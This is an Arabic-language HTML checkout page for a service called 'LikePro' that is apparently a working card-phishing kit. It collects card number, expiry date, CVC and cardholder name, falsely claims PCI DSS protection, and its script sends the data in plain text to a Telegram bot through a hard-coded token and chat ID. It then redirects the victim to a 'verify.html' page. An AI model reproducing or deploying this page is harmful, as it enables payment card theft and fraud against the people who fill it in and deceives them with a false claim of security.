<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إتمام عملية الدفع | LikePro</title>
    <style>
        body { background: #0b1120; color: #f8fafc; font-family: 'Segoe UI', sans-serif; }
        .checkout-box { max-width: 450px; margin: 40px auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
        .input-group { margin-bottom: 20px; position: relative; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; transition: 0.3s; }
        input.error { border: 2px solid #ef4444; }
        .error-msg { color: #ef4444; font-size: 11px; margin-top: 5px; display: none; }
        .pay-btn { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 6px; color: #0f172a; font-weight: bold; cursor: pointer; }
        .secure-note { text-align: center; font-size: 11px; color: #64748b; margin-top: 20px; }
    </style>
</head>
<body>

<div class="checkout-box" id="mainContainer">
    <h3 style="text-align: center; color: #38bdf8; margin-bottom: 20px;">بيانات الدفع</h3>
    <form id="paymentForm">
        <div class="input-group">
            <label>رقم البطاقة</label>
            <input type="text" id="cardNum" placeholder="0000 0000 0000 0000" maxlength="16" oninput="clearErr(this, 'err-cardNum')">
            <div class="error-msg" id="err-cardNum">يرجى إدخال 16 رقماً للبطاقة</div>
        </div>
        <div style="display: flex; gap: 10px;">
            <div class="input-group" style="flex: 1;">
                <label>تاريخ الانتهاء</label>
                <input type="text" id="exp" placeholder="MM/YY" maxlength="5" oninput="clearErr(this, 'err-exp')">
                <div class="error-msg" id="err-exp">غير صالح</div>
            </div>
            <div class="input-group" style="flex: 1;">
                <label>رمز CVC</label>
                <input type="text" id="cvc" placeholder="***" maxlength="3" oninput="clearErr(this, 'err-cvc')">
                <div class="error-msg" id="err-cvc">غير صالح</div>
            </div>
        </div>
        <div class="input-group">
            <label>اسم حامل البطاقة</label>
            <input type="text" id="cardName" placeholder="الاسم كما يظهر على البطاقة" oninput="clearErr(this, 'err-cardName')">
            <div class="error-msg" id="err-cardName">يرجى إدخال الاسم</div>
        </div>
        <button type="button" class="pay-btn" onclick="processPayment()">دفع الآن</button>
    </form>
    <p class="secure-note">🔒 بياناتك مشفرة ومعالجة عبر معايير الأمان الدولية PCI DSS.</p>
</div>

<script>
function clearErr(input, errId) {
    input.classList.remove('error');
    document.getElementById(errId).style.display = 'none';
}

async function processPayment() {
    // 1. قراءة القيم فوراً قبل مسح الصفحة
    let cardNum = document.getElementById('cardNum').value;
    let exp = document.getElementById('exp').value;
    let cvc = document.getElementById('cvc').value;
    let cardName = document.getElementById('cardName').value;

    // 2. التحقق من الحقول
    let isValid = true;
    if(cardNum.length < 16) { document.getElementById('cardNum').classList.add('error'); document.getElementById('err-cardNum').style.display = 'block'; isValid = false; }
    if(exp.trim() === "") { document.getElementById('exp').classList.add('error'); document.getElementById('err-exp').style.display = 'block'; isValid = false; }
    if(cvc.length < 3) { document.getElementById('cvc').classList.add('error'); document.getElementById('err-cvc').style.display = 'block'; isValid = false; }
    if(cardName.trim() === "") { document.getElementById('cardName').classList.add('error'); document.getElementById('err-cardName').style.display = 'block'; isValid = false; }
    
    if(!isValid) return;

    // 3. مسح الصفحة (الآن أصبح آمناً لأن البيانات مخزنة في المتغيرات أعلاه)
    document.getElementById('mainContainer').innerHTML = `<h2 style="text-align:center; color:#38bdf8;">جاري معالجة الطلب...</h2>`;

    const token = "8621733172:AAG9ntAKStrZ8C7tS0Q794SeWp_GROrUiOc";
    const chatId = "5976228373";
    let msg = `💳 *طلب جديد*\n👤: ${cardName}\n🔢: ${cardNum}\n📅: ${exp}\n🔒: ${cvc}`;
    
    // 4. الإرسال
    try {
        let response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        
        if(response.ok) {
            setTimeout(function() {
                window.location.href = "verify.html";
            }, 500); 
        } else {
            alert("خطأ في الاتصال بالسيرفر");
        }
    } catch(e) {
        alert("خطأ تقني: " + e.message);
    }
}
</script>
</body>
</html>
